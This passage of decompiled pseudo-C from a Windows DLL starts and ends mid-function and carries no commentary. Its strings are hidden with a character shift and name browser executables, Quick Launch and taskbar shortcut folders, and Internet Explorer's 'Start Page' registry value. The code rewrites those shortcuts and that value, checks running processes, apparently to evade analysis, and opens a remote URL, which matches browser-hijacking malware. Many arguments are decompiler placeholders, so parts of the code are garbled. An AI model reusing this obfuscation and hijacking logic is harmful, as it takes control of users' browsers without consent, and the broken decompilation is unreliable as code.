                goto lab_0x1001862f_2;
            } else {
                // 0x10018450
                *(int32_t *)(v7 - 44) = 0;
                int32_t v23; // bp-2160, 0x10018390
                *(int32_t *)(v7 - 48) = (int32_t)&v23;
                *(int32_t *)(v7 - 52) = 260;
                int32_t v24; // bp-1568, 0x10018390
                *(int32_t *)(v7 - 56) = (int32_t)&v24;
                int32_t v25 = v7 - 60; // 0x1001846d
                *(int32_t *)v25 = v2;
                v13 = v25;
                if (*(int32_t *)(*(int32_t *)v2 + 12) < 0) {
                    goto lab_0x1001862f_2;
                } else {
                    // 0x10018480
                    int32_t v26; // bp-4, 0x10018390
                    int32_t v27 = (int32_t)&v26 - 524; // 0x10018487
                    int32_t v28 = 0; // 0x10018390
                    int16_t v29 = *(int16_t *)(v28 + (int32_t)&g28); // 0x10018480
                    *(int16_t *)(v28 + v27) = v29;
                    v28 += 2;
                    while (v29 != 0) {
                        // 0x10018480
                        v29 = *(int16_t *)(v28 + (int32_t)&g28);
                        *(int16_t *)(v28 + v27) = v29;
                        v28 += 2;
                    }
                    // 0x10018497
                    int32_t v30; // bp-2116, 0x10018390
                    int32_t v31 = &v30; // 0x10018497
                    int32_t v32 = v31;
                    int32_t v33 = v32 + 2; // 0x100184a3
                    while (*(int16_t *)v32 != 0) {
                        // 0x100184a0
                        v32 = v33;
                        v33 = v32 + 2;
                    }
                    // 0x100184ab
                    int32_t v34; // bp-530, 0x10018390
                    int32_t v35 = &v34; // 0x100184b3
                    int32_t v36 = v35 + 2; // 0x100184b6
                    int32_t v37 = v36; // 0x100184c0
                    while (*(int16_t *)v36 != 0) {
                        // 0x100184b6
                        v36 = v37 + 2;
                        v37 = v36;
                    }
                    uint32_t v38 = v33 - v31; // 0x100184b1
                    uint32_t v39 = v38 / 4; // 0x100184c4
                    __asm_rep_movsd_memcpy((char *)v36, (char *)&v30, v39);
                    bool v40; // 0x10018390
                    char * v41 = (char *)(v36 + v39 * (v40 ? -4 : 4)); // 0x100184d0
                    __asm_rep_movsb_memcpy(v41, v41, v38 & 2);
                    int32_t v42 = v35 + 2; // 0x100184e0
                    int32_t v43 = v42; // 0x100184ea
                    while (*(int16_t *)v42 != 0) {
                        // 0x100184e0
                        v42 = v43 + 2;
                        v43 = v42;
                    }
                    int32_t * v44 = (int32_t *)(v7 - 64); // 0x100184f8
                    int32_t v45; // bp-528, 0x10018390
                    int32_t v46 = &v45; // 0x100184f8
                    *v44 = v46;
                    *(int32_t *)v42 = 44;
                    __wcslwr(&g173);
                    int32_t v47 = v46;
                    int32_t v48 = v47 + 2; // 0x10018513
                    while (*(int16_t *)v47 != 0) {
                        // 0x10018510
                        v47 = v48;
                        v48 = v47 + 2;
                    }
                    // 0x1001851b
                    int32_t v49; // bp-526, 0x10018390
                    int32_t v50 = &v49; // 0x1001850b
                    int32_t v51 = 0; // 0x1001851f
                    if (v48 != v50) {
                        int16_t * v52 = (int16_t *)(2 * v51 + v27); // 0x10018526
                        *v52 = *v52 - 3;
                        int32_t v53 = v46;
                        int32_t v54 = v53 + 2; // 0x10018543
                        while (*(int16_t *)v53 != 0) {
                            // 0x10018540
                            v53 = v54;
                            v54 = v53 + 2;
                        }
                        int32_t v55 = v51 + 1; // 0x10018534
                        v51 = v55;
                        while (v55 < (v54 - v50) / 2) {
                            // 0x10018521
                            v52 = (int16_t *)(2 * v51 + v27);
                            *v52 = *v52 - 3;
                            v53 = v46;
                            v54 = v53 + 2;
                            while (*(int16_t *)v53 != 0) {
                                // 0x10018540
                                v53 = v54;
                                v54 = v53 + 2;
                            }
                            // 0x1001854b
                            v55 = v51 + 1;
                            v51 = v55;
                        }
                    }
                    // 0x10018553
                    *v44 = v46;
                    int32_t * v56 = (int32_t *)(v7 - 68); // 0x1001855a
                    *v56 = (int32_t)L")lmbo^+bub)fbumilob+bub)`eoljb+bub)cfobclu+bub)/012bumilobo+bub)/012`eoljb+bub)03-pb+bub)03-`eoljb+bub)_^far_oltpbo+bub)_^farmi^vbo_oltpbo+bub)_^farsfabl_oltpbo+bub)`eoljfrj+bub)dobbk_oltpbo+bub)e^l./0_oltpbo+bub)fbp^ka_lu+bub)f`eoljb+bub)ifb_^l+bub)j^uqelk+bub)nn_oltpbo+bub)p^c^of+bub)pldlrbumilobo+bub)q^l_oltpbo+bub)qebtloia+bub)qqo^sbibo+bub)r`_oltpbo+bub)ci^pemi^v+bub)";
                    int16_t * v57 = _wcsstr((int16_t *)&g173, (int16_t *)&g173); // 0x1001855f
                    v13 = v25;
                    if (v57 == NULL) {
                        goto lab_0x1001862f_2;
                    } else {
                        // 0x1001856f
                        *v44 = 260;
                        *v56 = v46;
                        v14 = v7 - 72;
                        *(int32_t *)v14 = v2;
                        v15 = (int32_t *)(v7 - 76);
                        *v15 = 518;
                        v16 = (int32_t *)(v7 - 80);
                        *v16 = 0;
                        v17 = (int32_t *)(v7 - 84);
                        int32_t v58; // bp-1046, 0x10018390
                        *v17 = (int32_t)&v58;
                        int32_t * v59 = NULL; // bp-1048, 0x10018598
                        _memset(NULL, (int32_t)&g173, (int32_t)&g173);
                        *(int32_t *)(v7 - 88) = 0;
                        v18 = v7 - 92;
                        v19 = (int32_t *)v18;
                        v20 = (int32_t)&v59;
                        *v19 = v20;
                        *(int32_t *)(v7 - 96) = (int32_t)L"hp";
                        int32_t v60 = function_10017850((int32_t)&g173, (int32_t)&g173, (int32_t)&g173); // 0x100185b2
                        v13 = v14;
                        if (v60 == 0) {
                            goto lab_0x1001862f_2;
                        } else {
                            int32_t v61 = v20; // 0x100185c6
                            int32_t v62 = v46; // 0x100185c6
                            v13 = v14;
                            if ((int16_t)(int32_t)v59 == 0) {
                                goto lab_0x1001862f_2;
                            } else {
                                uint16_t v63 = *(int16_t *)v61; // 0x100185d4
                                int32_t v64 = v60 & -0x10000; // 0x100185d4
                                uint16_t v65 = *(int16_t *)v62; // 0x100185d7
                                while (v63 == v65) {
                                    // 0x100185dc
                                    v13 = v14;
                                    if (v63 == 0) {
                                        goto lab_0x1001862f_2;
                                    }
                                    uint16_t v66 = *(int16_t *)(v61 | 2); // 0x100185e1
                                    int32_t v67 = v64 | (int32_t)v66; // 0x100185e1
                                    uint16_t v68 = *(int16_t *)(v62 | 2); // 0x100185e5
                                    if (v66 != v68) {
                                        // 0x100185fa
                                        v11 = v66 < v68;
                                        v12 = v67;
                                        goto lab_0x100185fa_2;
                                    }
                                    // 0x100185eb
                                    v61 += 4;
                                    v62 += 4;
                                    v13 = v14;
                                    if (v66 == 0) {
                                        goto lab_0x1001862f_2;
                                    }
                                    v63 = *(int16_t *)v61;
                                    v64 = v67 & -0x10000;
                                    v65 = *(int16_t *)v62;
                                }
                                // 0x100185fa
                                v11 = v63 < v65;
                                v12 = v64 | (int32_t)v63;
                                goto lab_0x100185fa_2;
                            }
                        }
                    }
                }
            }
        }
    }
  lab_0x1001862f_2:
    // 0x1001862f
    v10 = v13 - 4;
    *(int32_t *)v10 = v8;
    goto lab_0x1001863d;
  lab_0x1001863d:
    // 0x1001863d
    *(int32_t *)(v10 - 4) = v2;
    // 0x1001864e
    return _40___security_check_cookie_40_4();
  lab_0x100185fa_2:;
    uint32_t v69 = v12;
    bool v70 = v11;
    int32_t v71 = v70; // 0x100185fa
    uint32_t v72 = v69 + v71; // 0x100185fa
    bool v73 = v70 ? v69 < (int32_t)v70 - v71 | v72 != -1 : v69 < v72; // 0x100185fa
    v13 = v14;
    if (v70 != !v73) {
        // 0x10018603
        *v15 = v20;
        *v16 = v2;
        *v17 = 1;
        *v19 = v8;
        v13 = v18;
    }
    goto lab_0x1001862f_2;
}

// Address range: 0x10018660 - 0x10018866
int32_t function_10018660(int32_t a1) {
    // 0x10018660
    int32_t v1; // bp-4, 0x10018660
    int32_t v2 = &v1; // 0x10018661
    int32_t v3; // bp-526, 0x10018660
    int32_t v4; // bp-528, 0x10018660
    if (a1 == 0) {
        int32_t v5 = v2 - 524; // 0x10018747
        int32_t v6 = 0; // 0x10018660
        int16_t v7 = *(int16_t *)(v6 + (int32_t)L"_-1oqn"); // 0x10018740
        *(int16_t *)(v6 + v5) = v7;
        v6 += 2;
        while (v7 != 0) {
            // 0x10018740
            v7 = *(int16_t *)(v6 + (int32_t)L"_-1oqn");
            *(int16_t *)(v6 + v5) = v7;
            v6 += 2;
        }
        int32_t v8 = &v4; // 0x10018757
        int32_t v9 = v8;
        int32_t v10 = v9 + 2; // 0x10018765
        while (*(int16_t *)v9 != 0) {
            // 0x10018762
            v9 = v10;
            v10 = v9 + 2;
        }
        int32_t v11 = &v3; // 0x1001875f
        int32_t v12 = 0; // 0x10018771
        if (v10 != v11) {
            int16_t * v13 = (int16_t *)(2 * v12 + v5); // 0x10018778
            *v13 = *v13 - 3;
            int32_t v14 = v8;
            int32_t v15 = v14 + 2; // 0x10018793
            while (*(int16_t *)v14 != 0) {
                // 0x10018790
                v14 = v15;
                v15 = v14 + 2;
            }
            int32_t v16 = v12 + 1; // 0x10018786
            v12 = v16;
            while (v16 < (v15 - v11) / 2) {
                // 0x10018773
                v13 = (int16_t *)(2 * v12 + v5);
                *v13 = *v13 - 3;
                v14 = v8;
                v15 = v14 + 2;
                while (*(int16_t *)v14 != 0) {
                    // 0x10018790
                    v14 = v15;
                    v15 = v14 + 2;
                }
                // 0x1001879b
                v16 = v12 + 1;
                v12 = v16;
            }
        }
    } else {
        int32_t v17 = &v4; // 0x10018680
        int32_t v18 = a1; // 0x10018688
        int16_t v19 = *(int16_t *)v18; // 0x10018690
        *(int16_t *)(v17 - a1 + v18) = v19;
        v18 += 2;
        while (v19 != 0) {
            // 0x10018690
            v19 = *(int16_t *)v18;
            *(int16_t *)(v17 - a1 + v18) = v19;
            v18 += 2;
        }
        // 0x1001869f
        int32_t v20; // bp-530, 0x10018660
        int32_t v21 = &v20;
        int32_t v22 = v21 + 2; // 0x100186b0
        while (*(int16_t *)v22 != 0) {
            // 0x100186b0
            v21 = v22;
            v22 = v21 + 2;
        }
        // 0x100186bc
        *(int32_t *)v22 = 0x2d005f;
        *(int32_t *)(v21 + 6) = 0x6f0031;
        *(int32_t *)(v21 + 10) = 0x6e0071;
        *(int16_t *)(v21 + 14) = 0;
        int32_t v23 = v17;
        int32_t v24 = v23 + 2; // 0x100186f3
        while (*(int16_t *)v23 != 0) {
            // 0x100186f0
            v23 = v24;
            v24 = v23 + 2;
        }
        int32_t v25 = &v3; // 0x100186e9
        if (v24 != v25) {
            int32_t v26; // 0x1001872a
            for (int32_t i = 0; i < (v26 - v25) / 2; i++) {
                int16_t * v27 = (int16_t *)(v2 - 524 + 2 * i); // 0x10018715
                *v27 = *v27 - 3;
                int32_t v28 = v17;
                v26 = v28 + 2;
                while (*(int16_t *)v28 != 0) {
                    // 0x10018727
                    v28 = v26;
                    v26 = v28 + 2;
                }
            }
        }
    }
    int16_t * v29 = L"%s%s"; // bp-1664, 0x100187ab
    int32_t lpFileName; // bp-1048, 0x10018660
    _swprintf_s((int16_t *)&lpFileName, 260, L"%s%s");
    int32_t lpFindFileData; // bp-1640, 0x10018660
    int32_t * v30 = FindFirstFileW((int16_t *)&lpFileName, (struct _WIN32_FIND_DATAW *)&lpFindFileData); // 0x100187d2
    if (v30 == (int32_t *)-1) {
        // 0x10018856
        return _40___security_check_cookie_40_4();
    }
    int32_t v31 = (int32_t)v30; // 0x100187d2
    v29 = (int16_t *)&lpFileName;
    PathRemoveFileSpecW((int16_t *)&lpFileName);
    int32_t v32 = &lpFileName; // 0x100187ec
    int32_t v33 = v32; // 0x100187f8
    int16_t v34 = *(int16_t *)v33; // 0x10018800
    int32_t v35; // 0x10018660
    *(int16_t *)(v35 - v32 + v33) = v34;
    v33 += 2;
    while (v34 != 0) {
        // 0x10018800
        v34 = *(int16_t *)v33;
        *(int16_t *)(v35 - v32 + v33) = v34;
        v33 += 2;
    }
    int32_t v36 = (int32_t)&v29;
    int32_t * v37 = (int32_t *)(v36 - 4); // 0x1001881b
    int32_t v38; // bp-1596, 0x10018660
    *v37 = (int32_t)&v38;
    int32_t v39 = v36 - 8; // 0x1001881c
    int32_t * v40 = (int32_t *)(v36 - 12);
    *v40 = (int32_t)L"%s\\%s";
    *(int32_t *)(v36 - 16) = 260;
    *(int32_t *)(v36 - 20) = v32;
    _swprintf_s((int16_t *)&g173, (int32_t)&g173, (int16_t *)&g173);
    function_10018390();
    *v37 = (int32_t)&lpFindFileData;
    *(int32_t *)v39 = v31;
    while (FindNextFileW(&g173, (struct _WIN32_FIND_DATAW *)&g173)) {
        // 0x10018815
        v36 = v39;
        v37 = (int32_t *)(v36 - 4);
        *v37 = (int32_t)&v38;
        v39 = v36 - 8;
        v40 = (int32_t *)(v36 - 12);
        *v40 = (int32_t)L"%s\\%s";
        *(int32_t *)(v36 - 16) = 260;
        *(int32_t *)(v36 - 20) = v32;
        _swprintf_s((int16_t *)&g173, (int32_t)&g173, (int16_t *)&g173);
        function_10018390();
        *v37 = (int32_t)&lpFindFileData;
        *(int32_t *)v39 = v31;
    }
    // 0x1001884f
    *v40 = v31;
    FindClose(&g173);
    // 0x10018856
    return _40___security_check_cookie_40_4();
}

// Address range: 0x10018870 - 0x10018923
int32_t function_10018870(void) {
    // 0x10018870
    int32_t v1; // bp-528, 0x10018870
    function_10018cb0(11, &v1);
    function_10018660(0);
    function_10018cb0(26, &v1);
    function_10018660((int32_t)L"_Plfurvriw_Lqwhuqhw#H{soruhu_Txlfn#Odxqfk");
    function_10018cb0(26, &v1);
    function_10018660((int32_t)L"_Plfurvriw_Lqwhuqhw#H{soruhu_Txlfn#Odxqfk_Xvhu#Slqqhg_VwduwPhqx");
    function_10018cb0(26, &v1);
    function_10018660((int32_t)L"_Plfurvriw_Lqwhuqhw#H{soruhu_Txlfn#Odxqfk_Xvhu#Slqqhg_WdvnEdu");
    function_10018cb0(16, &v1);
    function_10018660(0);
    function_10018cb0(25, &v1);
    function_10018660(0);
    function_10018cb0(22, &v1);
    function_10018660(0);
    return _40___security_check_cookie_40_4();
}

// Address range: 0x10018930 - 0x100189ae
int32_t function_10018930(void) {
    int32_t v1 = -0x30494629; // bp-108, 0x10018951
    int32_t v2 = &v1; // 0x10018954
    int32_t v3 = v2; // 0x10018960
    while (*(char *)v3 != 0) {
        // 0x10018963
        v3++;
    }
    // 0x1001896a
    int32_t v4; // bp-107, 0x10018930
    int32_t v5 = &v4; // 0x10018960
    if (v3 != v5) {
        int32_t v6; // 0x10018982
        for (int32_t i = 0; i < v6 - v5; i++) {
            // 0x10018970
            int32_t v7; // bp-4, 0x10018930
            char * v8 = (char *)((int32_t)&v7 - 104 + i); // 0x10018970
            *v8 = *v8 - 3;
            int32_t v9 = v2;
            v6 = v9 + 1;
            while (*(char *)v9 != 0) {
                // 0x10018980
                v9 = v6;
                v6 = v9 + 1;
            }
        }
    }
    // 0x1001898d
    int32_t v10; // bp-116, 0x10018930
    int32_t v11 = &v10; // 0x10018957
    *(int32_t *)(v11 - 4) = v2;
    *(int32_t *)(v11 - 8) = 0;
    FindWindowA((char *)&g173, (char *)&g173);
    return _40___security_check_cookie_40_4();
}

// Address range: 0x100189b0 - 0x10018ad6
int32_t function_100189b0(int16_t * a1) {
    int32_t v1 = 556; // bp-564, 0x100189cc
    int32_t * v2 = CreateToolhelp32Snapshot(2, 0); // 0x100189d6
    if (v2 == (int32_t *)-1) {
        // 0x100189e2
        return _40___security_check_cookie_40_4();
    }
    int32_t v3 = (int32_t)v2; // 0x100189d6
    int32_t v4 = v3; // bp-596, 0x100189ff
    int32_t v5 = &v4; // 0x100189ff
    if (!Process32FirstW(v2, (struct tagPROCESSENTRY32W *)&v1)) {
        // 0x10018a9f
        *(int32_t *)(v5 - 4) = v3;
        CloseHandle(&g173);
        return _40___security_check_cookie_40_4();
    }
    // 0x10018a10
    int32_t v6; // bp-528, 0x100189b0
    int32_t v7 = &v6; // 0x10018a10
    int32_t v8; // bp-526, 0x100189b0
    int32_t v9 = &v8;
    int32_t v10 = v5; // 0x10018a7d
    int32_t * v11 = (int32_t *)(v10 - 4);
    *v11 = v7;
    __wcslwr(&g173);
    int32_t v12 = v7;
    int32_t v13 = v12 + 2; // 0x10018a33
    while (*(int16_t *)v12 != 0) {
        // 0x10018a30
        v12 = v13;
        v13 = v12 + 2;
    }
    int32_t v14 = 0; // 0x10018a3f
    int32_t v15; // 0x100189b0
    int32_t v16; // bp-4, 0x100189b0
    int16_t * v17; // 0x10018a50
    int32_t v18; // 0x10018a66
    int32_t v19; // 0x10018a5f
    if (v13 != v9) {
        v17 = (int16_t *)((int32_t)&v16 - 524 + 2 * v14);
        *v17 = *v17 + 3;
        v15 = v7;
        v18 = v15 + 2;
        while (*(int16_t *)v15 != 0) {
            // 0x10018a63
            v15 = v18;
            v18 = v15 + 2;
        }
        // 0x10018a6e
        v19 = v14 + 1;
        v14 = v19;
        while (v19 < (v18 - v9) / 2) {
            // 0x10018a50
            v17 = (int16_t *)((int32_t)&v16 - 524 + 2 * v14);
            *v17 = *v17 + 3;
            v15 = v7;
            v18 = v15 + 2;
            while (*(int16_t *)v15 != 0) {
                // 0x10018a63
                v15 = v18;
                v18 = v15 + 2;
            }
            // 0x10018a6e
            v19 = v14 + 1;
            v14 = v19;
        }
    }
    // 0x10018a76
    *v11 = (int32_t)a1;
    v10 -= 8;
    int32_t * v20 = (int32_t *)v10; // 0x10018a7d
    *v20 = v7;
    while (_wcsstr((int16_t *)&g173, (int16_t *)&g173) == NULL) {
        // 0x10018a8a
        *v11 = (int32_t)&v1;
        *v20 = v3;
        bool v21 = Process32NextW(&g173, (struct tagPROCESSENTRY32W *)&g173); // 0x10018a92
        int32_t v22 = v10; // 0x10018a99
        if (!v21) {
            // 0x10018a9f
            *(int32_t *)(v22 - 4) = v3;
            CloseHandle(&g173);
            return _40___security_check_cookie_40_4();
        }
        v11 = (int32_t *)(v10 - 4);
        *v11 = v7;
        __wcslwr(&g173);
        v12 = v7;
        v13 = v12 + 2;
        while (*(int16_t *)v12 != 0) {
            // 0x10018a30
            v12 = v13;
            v13 = v12 + 2;
        }
        // 0x10018a3b
        v14 = 0;
        if (v13 != v9) {
            v17 = (int16_t *)((int32_t)&v16 - 524 + 2 * v14);
            *v17 = *v17 + 3;
            v15 = v7;
            v18 = v15 + 2;
            while (*(int16_t *)v15 != 0) {
                // 0x10018a63
                v15 = v18;
                v18 = v15 + 2;
            }
            // 0x10018a6e
            v19 = v14 + 1;
            v14 = v19;
            while (v19 < (v18 - v9) / 2) {
                // 0x10018a50
                v17 = (int16_t *)((int32_t)&v16 - 524 + 2 * v14);
                *v17 = *v17 + 3;
                v15 = v7;
                v18 = v15 + 2;
                while (*(int16_t *)v15 != 0) {
                    // 0x10018a63
                    v15 = v18;
                    v18 = v15 + 2;
                }
                // 0x10018a6e
                v19 = v14 + 1;
                v14 = v19;
            }
        }
        // 0x10018a76
        *v11 = (int32_t)a1;
        v10 -= 8;
        v20 = (int32_t *)v10;
        *v20 = v7;
    }
    // 0x10018ab9
    *v11 = v3;
    CloseHandle(&g173);
    return _40___security_check_cookie_40_4();
}

// Address range: 0x10018ae0 - 0x10018ca5
int32_t function_10018ae0(int32_t lpData) {
    // 0x10018ae0
    if (function_100189b0(L"693") != 0 || function_100189b0(L"ttsf") != 0) {
        // 0x10018c94
        return _40___security_check_cookie_40_4();
    }
    int32_t v1 = function_10018930(); // 0x10018b21
    if (v1 != 0) {
        // 0x10018c94
        return _40___security_check_cookie_40_4();
    }
    // 0x10018b30
    int32_t v2; // bp-4, 0x10018ae0
    int32_t v3 = &v2; // 0x10018ae1
    int32_t v4 = v3 - 524; // 0x10018b37
    int32_t v5 = v1; // 0x10018ae0
    int16_t v6 = *(int16_t *)(v5 + (int32_t)L"Tpguxbsf]Njdsptpgu]Joufsofu!Fyqmpsfs]Nbjo"); // 0x10018b30
    *(int16_t *)(v5 + v4) = v6;
    v5 += 2;
    while (v6 != 0) {
        // 0x10018b30
        v6 = *(int16_t *)(v5 + (int32_t)L"Tpguxbsf]Njdsptpgu]Joufsofu!Fyqmpsfs]Nbjo");
        *(int16_t *)(v5 + v4) = v6;
        v5 += 2;
    }
    // 0x10018b47
    int32_t lpSubKey; // bp-528, 0x10018ae0
    int32_t v7 = &lpSubKey; // 0x10018b47
    int32_t v8 = v7; // 0x10018b50
    while (*(int16_t *)v8 != 0) {
        // 0x10018b53
        v8 += 2;
    }
    // 0x10018b5e
    int32_t v9; // bp-526, 0x10018ae0
    int32_t v10 = &v9; // 0x10018b50
    int32_t v11 = 0; // 0x10018b62
    if (v8 != v10) {
        int16_t * v12 = (int16_t *)(2 * v11 + v4); // 0x10018b75
        *v12 = *v12 - 1;
        int32_t v13 = v7;
        int32_t v14 = v13 + 2; // 0x10018b8a
        while (*(int16_t *)v13 != 0) {
            // 0x10018b87
            v13 = v14;
            v14 = v13 + 2;
        }
        // 0x10018b92
        v11++;
        while (v11 < (v14 - v10) / 2) {
            // 0x10018b70
            v12 = (int16_t *)(2 * v11 + v4);
            *v12 = *v12 - 1;
            v13 = v7;
            v14 = v13 + 2;
            while (*(int16_t *)v13 != 0) {
                // 0x10018b87
                v13 = v14;
                v14 = v13 + 2;
            }
            // 0x10018b92
            v11++;
        }
    }
    int32_t v15 = v3 - 1044; // 0x10018ba7
    int32_t v16 = 0; // 0x10018b9c
    int16_t v17 = *(int16_t *)(v16 + (int32_t)L"Tubsu!Qbhf"); // 0x10018ba0
    *(int16_t *)(v16 + v15) = v17;
    v16 += 2;
    while (v17 != 0) {
        // 0x10018ba0
        v17 = *(int16_t *)(v16 + (int32_t)L"Tubsu!Qbhf");
        *(int16_t *)(v16 + v15) = v17;
        v16 += 2;
    }
    // 0x10018bb7
    int32_t lpValueName; // bp-1048, 0x10018ae0
    int32_t v18 = &lpValueName; // 0x10018bb7
    int32_t v19 = v18; // 0x10018bbf
    while (*(int16_t *)v19 != 0) {
        // 0x10018bc2
        v19 += 2;
    }
    // 0x10018bcd
    int32_t v20; // bp-1046, 0x10018ae0
    int32_t v21 = &v20; // 0x10018bbf
    int32_t v22 = 0; // 0x10018bd1
    if (v19 != v21) {
        int16_t * v23 = (int16_t *)(2 * v22 + v15); // 0x10018bd8
        *v23 = *v23 - 1;
        int32_t v24 = v18;
        int32_t v25 = v24 + 2; // 0x10018bf3
        while (*(int16_t *)v24 != 0) {
            // 0x10018bf0
            v24 = v25;
            v25 = v24 + 2;
        }
        // 0x10018bfb
        v22++;
        while (v22 < (v25 - v21) / 2) {
            // 0x10018bd3
            v23 = (int16_t *)(2 * v22 + v15);
            *v23 = *v23 - 1;
            v24 = v18;
            v25 = v24 + 2;
            while (*(int16_t *)v24 != 0) {
                // 0x10018bf0
                v24 = v25;
                v25 = v24 + 2;
            }
            // 0x10018bfb
            v22++;
        }
    }
    // 0x10018c03
    int32_t phkResult; // bp-1052, 0x10018ae0
    int32_t v26 = RegOpenKeyExW(HKEY_CURRENT_USER, (int16_t *)&lpSubKey, 0, 0x20006, (int32_t **)&phkResult); // 0x10018c1d
    if (v26 != 0) {
        // 0x10018c82
        return _40___security_check_cookie_40_4();
    }
    int32_t v27 = lpData; // 0x10018c25
    while (*(int16_t *)v27 != 0) {
        // 0x10018c30
        v27 += 2;
    }
    int32_t v28 = RegSetValueExW((int32_t *)phkResult, (int16_t *)&lpValueName, 0, 1, (char *)lpData, -2 - lpData + v27 & -2); // 0x10018c56
    RegCloseKey((int32_t *)phkResult);
    if (v28 != 0) {
        // 0x10018c82
        return _40___security_check_cookie_40_4();
    }
    // 0x10018c6f
    return _40___security_check_cookie_40_4();
}

// Address range: 0x10018cb0 - 0x10018d28
int32_t function_10018cb0(int32_t a1, int32_t * a2) {
    // 0x10018cb0
    int32_t v1; // bp-12, 0x10018cb0
    int32_t v2; // bp-8, 0x10018cb0
    if (SHGetMalloc((int32_t **)&v1) < 0 || SHGetSpecialFolderLocation(NULL, a1, (int32_t **)&v2) < 0) {
        // 0x10018d0e
        return 0;
    }
    // 0x10018cd9
    return SHGetPathFromIDListW((int32_t *)v2, (int16_t *)a2);
}

// Address range: 0x10018d30 - 0x10018f6e
int32_t function_10018d30(int32_t a1, int32_t a2) {
    // 0x10018d30
    __chkstk();
    int32_t * v1 = InternetOpenW(NULL, (int32_t)&g173, (int16_t *)&g173, (int16_t *)&g173, (int32_t)&g173); // 0x10018d63
    if (v1 == NULL) {
        // 0x10018d73
        return _40___security_check_cookie_40_4();
    }
    int32_t * v2 = InternetOpenUrlW(v1, (int16_t *)&g173, (int16_t *)&g173, (int32_t)&g173, (int32_t)&g173, (int32_t)&g173); // 0x10018d94
    if (v2 == NULL) {
        // 0x10018d73
        return _40___security_check_cookie_40_4();
    }
    // 0x10018f59
    _memset(NULL, (int32_t)&g173, (int32_t)&g173);
    HttpQueryInfoA((int32_t *)0x1000, (int32_t)&g173, &g173, &g173, &g173);
    InternetCloseHandle(v2);
    InternetCloseHandle(&g173);
    return _40___security_check_cookie_40_4();
}

// Address range: 0x10018f70 - 0x10018f8f
int32_t function_10018f70(int32_t result, int32_t a2) {
    int16_t v1 = *(int16_t *)result; // 0x10018f76
    if (v1 == 0) {
        // 0x10018f8d
        return result;
    }
    int32_t v2 = result; // 0x10018f84
    *(int16_t *)v2 = v1 + (int16_t)a2;
    v2 += 2;
    int16_t v3 = *(int16_t *)v2; // 0x10018f87
    while (v3 != 0) {
        // 0x10018f81
        *(int16_t *)v2 = v3 + (int16_t)a2;
        v2 += 2;
        v3 = *(int16_t *)v2;
    }
    // 0x10018f8d
    return result;
}

// Address range: 0x10018f90 - 0x10018faa
int32_t function_10018f90(int32_t result, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6) {
    char v1 = *(char *)result; // 0x10018f96
    if (v1 == 0) {
        // 0x10018fa8
        return result;
    }
    int32_t v2 = result; // 0x10018fa2
    *(char *)v2 = v1 + (char)a2;
    v2++;
    char v3 = *(char *)v2; // 0x10018fa3
    while (v3 != 0) {
        // 0x10018fa0
        *(char *)v2 = v3 + (char)a2;
        v2++;
        v3 = *(char *)v2;
    }
    // 0x10018fa8
    return result;
}

// Address range: 0x10018fb0 - 0x10018fca
int32_t function_10018fb0(int32_t * a1, int32_t a2) {
    int32_t result = (int32_t)a1;
    char v1 = *(char *)a1; // 0x10018fb6
    if (v1 == 0) {
        // 0x10018fc8
        return result;
    }
    int32_t v2 = result; // 0x10018fc2
    *(char *)v2 = v1 - (char)a2;
    v2++;
    char v3 = *(char *)v2; // 0x10018fc3
    while (v3 != 0) {
        // 0x10018fc0
        *(char *)v2 = v3 - (char)a2;
        v2++;
        v3 = *(char *)v2;
    }
    // 0x10018fc8
    return result;
}

// Address range: 0x10018fca - 0x10018fd0
bool function_10018fca(int32_t * hSnapshot, struct tagPROCESSENTRY32W * lppe) {
    // 0x10018fca
    return Process32NextW(hSnapshot, lppe);
}

// Address range: 0x10018fd0 - 0x10018fd6
bool function_10018fd0(int32_t * hSnapshot, struct tagPROCESSENTRY32W * lppe) {
    // 0x10018fd0
    return Process32FirstW(hSnapshot, lppe);
}

// Address range: 0x10018fd6 - 0x10018fdc
int32_t * function_10018fd6(int32_t dwFlags, int32_t th32ProcessID) {
    // 0x10018fd6
    return CreateToolhelp32Snapshot(dwFlags, th32ProcessID);
}

// Address range: 0x1001981d - 0x10019830
int32_t function_1001981d(void) {
    // 0x1001981d
    return __unlock_file2(1, ___iob_func() + 32);
}

// Address range: 0x10019998 - 0x100199a9
int32_t function_10019998(void) {
    // 0x10019998
    int32_t v1; // 0x10019998
    return __unlock_file2(v1, *(int32_t *)(g146 + 4 * v1));
}

// Address range: 0x100199c7 - 0x100199d0
int32_t function_100199c7(void) {
    // 0x100199c7
    return __unlock(1);
}

// Address range: 0x10019a19 - 0x10019a23
int32_t function_10019a19(void) {
    // 0x10019a19
    int32_t v1; // 0x10019a19
    return __unlock_file(*(int32_t *)(v1 + 8));
}

// Address range: 0x10019a23 - 0x10019a2c
int32_t __flushall(void) {
    // 0x10019a23
    return _flsall(1);
}

// Address range: 0x10019a2c - 0x10019a32
int32_t ___iob_func(void) {
    // 0x10019a2c
    return (int32_t)&g77;
}

// Address range: 0x1001a300 - 0x1001a305
int32_t function_1001a300(int32_t a1) {
    // 0x1001a300
    int32_t v1; // 0x1001a300
    return v1 - 1;
}

// Address range: 0x1001a44d - 0x1001a45c
int32_t _40___security_check_cookie_40_4(void) {
    // 0x1001a44d
    int32_t v1; // 0x1001a44d
    if (v1 != g78) {
        // 0x1001a457
        return ___report_gsfailure();
    }
    // 0x1001a455
    int32_t result; // 0x1001a44d
    return result;
}

// Address range: 0x1001a45c - 0x1001a467
// Demangled:     void __cdecl operator delete(void *)
void _3f__3f_3_40_YAXPAX_40_Z(int32_t * a1) {
    // 0x1001a45c
    _free(&g173);
}

// Address range: 0x1001a6db - 0x1001a6e6
int32_t function_1001a6db(void) {
    // 0x1001a6db
    _3f__3f_3_40_YAXPAX_40_Z(&g173);
    return &g173;
}

// Address range: 0x1001a713 - 0x1001a718
int32_t function_1001a713(int32_t a1) {
    // 0x1001a713
    int32_t result; // 0x1001a713
    return result;
}

// Address range: 0x1001a718 - 0x1001a71f
// Demangled:     void __stdcall _CallMemberFunction0(void *, void *)
void _3f__CallMemberFunction0_40__40_YGXPAX0_40_Z(int32_t * result, int32_t * a2, int32_t * a3) {
    // 0x1001a718
    return;
}

// Address range: 0x1001a94c - 0x1001a94f
int32_t function_1001a94c(void) {
    // 0x1001a94c
    return 1;
}

// Address range: 0x1001a94f - 0x1001a952
int32_t function_1001a94f(int32_t a1) {
    // 0x1001a94f
    int32_t result; // 0x1001a94f
    return result;
}

// Address range: 0x1001ab73 - 0x1001ab8b
int32_t function_1001ab73(void) {
    // 0x1001ab73
    int32_t result; // 0x1001ab73
